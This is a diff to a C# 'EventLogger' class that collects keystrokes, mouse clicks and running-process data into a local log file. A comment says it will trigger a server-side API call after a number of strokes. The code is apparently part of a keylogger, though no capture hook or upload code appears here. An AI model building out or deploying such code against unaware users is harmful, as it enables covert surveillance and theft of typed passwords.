@@ -1,5 +1,4 @@
-﻿using System.ComponentModel;
-using System.Diagnostics;
+﻿using System.Diagnostics;
 
 namespace EventLogger;
 // class that handles the logging of events
@@ -9,11 +8,17 @@ public class Logger
     private int _strokes = 0; // used to determine when invoke a server-side api
     private DateTime _previousClick = DateTime.Now; // used to determine double-left-click
     private String _processes = ""; // used to determine if a process is running
-    private StreamWriter _writer;
+    
     public Logger()
     {
+        if (!File.Exists(Constants.PATH))
+        {
+            using (StreamWriter sw = File.CreateText(Constants.PATH))
+            {
+                sw.WriteLine("[INIT]");
+            }	
+        }
         _line = "";
-        _writer = File.AppendText(Utils.PATH);
     }
 
     public void MouseLog(String key)
@@ -29,6 +34,7 @@ public class Logger
         }
         _line += key;
     }
+    
     public void KeyLog(String key)
     {
         _line += key;
@@ -57,9 +63,17 @@ public class Logger
     
     private void Log()
     {
-        Console.WriteLine(_line);
-        _writer.WriteLine(_line);
+        // method that logs the current line
+        using (StreamWriter w = File.AppendText(Constants.PATH))
+        {
+            w.WriteLine(_line);
+        }
         _line = "";
+    }
+
+    public void SendLog()
+    {
+        Console.WriteLine(_line);
     }
     
 }
